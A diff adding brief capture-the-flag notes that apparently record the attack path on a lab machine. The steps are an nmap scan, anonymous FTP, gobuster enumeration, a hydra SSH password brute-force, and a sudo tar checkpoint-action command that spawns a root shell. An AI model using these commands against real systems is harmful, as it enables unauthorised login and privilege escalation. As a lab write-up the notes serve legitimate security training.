@@ -1,1 +1,15 @@
+$ nmap -sV -sC 10.10.179.118
 
+Discovered open port 22/tcp on 10.10.179.118
+Discovered open port 21/tcp on 10.10.179.118 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+Discovered open port 80/tcp on 10.10.179.118
+
+$ gobuster dir -e -u http://10.10.179.118 -w /home/iftx/Desktop/Hacking/Room/wordlist/common.txt -x .php,.txt,.js,.html
+
+$ ftp 10.10.179.118
+$ hydra -l lin -P ./locks.txt 10.10.179.118 -t 4 ssh
+$ sudo -l  --> tar
+
+https://gtfobins.github.io/gtfobins/tar/#shell
+
+$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
